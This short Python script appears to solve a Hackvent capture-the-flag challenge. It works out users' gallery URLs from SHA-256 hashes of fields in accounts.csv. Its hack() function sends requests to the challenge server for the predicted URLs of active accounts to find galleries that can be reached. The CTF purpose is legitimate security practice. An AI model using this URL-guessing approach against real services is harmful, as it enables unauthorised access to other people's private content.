import csv
import base64
import hashlib
import binascii
from urllib.request import urlopen
from urllib.error import HTTPError


def search():
    url = "bncqYuhdQVey9omKA6tAFi4rep1FDRtD4H8ftWiw"
    print( "Searching for: {}".format(url) )

    with open("accounts.csv", "r") as csvfile:
        csvreader = csv.reader(csvfile, delimiter=',', quotechar='|')
        for row in csvreader:
            if row[1] == "Danny":
                sha256 = hashlib.sha256()
                sha256.update(row[6].encode("ASCII"))
                digest = sha256.digest()
                user_url = base64.b64encode(digest)
                print(user_url.decode("ASCII"))
                user_url = user_url.decode("ASCII").replace('+', '')
                user_url = user_url.replace('=', '')
                user_url = user_url.replace('/', '')
                if user_url == url:
                    print( "Found: {}".format(row) )

def hack():
    base_url = "http://challenges.hackvent.hacking-lab.com:3958/gallery/"
    with open("accounts.csv", "r") as csvfile:
        csvreader = csv.reader(csvfile, delimiter=',', quotechar='|')
        for row in csvreader:
            if (row[1] == "Thumper" and row[14] == "active"):
                sha256 = hashlib.sha256()
                sha256.update(row[6].encode("ASCII"))
                digest = sha256.hexdigest()
                user_url = base64.b64encode(binascii.unhexlify(digest))
                user_url = user_url.decode("ASCII").replace('+', '')
                user_url = user_url.replace('=', '')
                user_url = user_url.replace('/', '')
                try:
                    response = urlopen(base_url + user_url)
                except HTTPError as e:
                    continue
                else:
                    print( "Found: {}".format(user_url) )


search()
#hack()
